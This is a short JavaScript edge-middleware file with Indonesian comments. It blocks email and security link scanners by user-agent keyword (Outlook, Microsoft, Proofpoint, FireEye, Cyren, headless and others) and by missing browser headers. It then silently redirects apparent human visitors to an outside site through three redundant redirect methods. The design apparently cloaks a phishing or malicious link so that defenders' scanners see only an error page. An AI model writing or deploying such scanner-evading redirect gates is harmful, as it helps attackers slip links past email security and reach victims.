export default function middleware(req) {
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  
  // 1. FINGERPRINTING: Header yang WAJIB ada di Browser Manusia Modern
  const hasSecChUa = req.headers.has('sec-ch-ua');           // Header Keamanan Chrome/Edge/Opera
  const hasAcceptLang = req.headers.has('accept-language');   // Bahasa (ID, EN, dll)
  const hasAccept = req.headers.has('accept');               // Format data yang diterima browser
  
  // 2. DAFTAR HITAM: Bot Murni & Scanner Security (Tetap aktif sebagai filter awal)
  const hardBotKeywords = [
    'bot', 'spider', 'crawler', 'scanner', 'outlook', 'office', 'microsoft',
    'linkdetect', 'bing', 'preview', 'headless', 'googleusercontent',
    'lighthouse', 'slurp', 'inspect', 'fetch', 'embed', 'clark', 'cloud',
    'internal', 'proxy', 'verification', 'cyren', 'proofpoint', 'fireeye'
  ];

  const isHardBot = hardBotKeywords.some(keyword => ua.includes(keyword));

  // 3. LOGIKA FILTER (DETEKSI MESIN)
  // Syarat Blokir:
  // - Terdeteksi kata kunci bot murni
  // - ATAU User-Agent terlalu pendek (Ciri khas script otomatis)
  // - ATAU TIDAK punya header keamanan modern (sec-ch-ua) -> Ini cara jitu bedain User vs Bot Comcast
  // - ATAU TIDAK punya header bahasa
  if (isHardBot || ua.length < 50 || !hasSecChUa || !hasAcceptLang || !hasAccept) {
    // Jika salah satu syarat di atas terpenuhi, kita anggap itu BOT
    return new Response('Error 403: Access Denied', { 
      status: 403,
      headers: { 'Content-Type': 'text/plain' }
    });
  }

  // 4. JIKA LOLOS (BERARTI MANUSIA/USER ASLI)
  const targetUrl = 'https://nusaindahrp.com/?dev';
  
  // Gunakan Meta-Refresh di dalam Body sebagai lapisan redirect tambahan
  return new Response(
    `<html><head><meta http-equiv="refresh" content="0;url=${targetUrl}"></head><body><script>window.location.href="${targetUrl}"</script></body></html>`,
    {
      status: 200,
      headers: {
        'Content-Type': 'text/html',
        'Refresh': `0; url=${targetUrl}`
      }
    }
  );
}
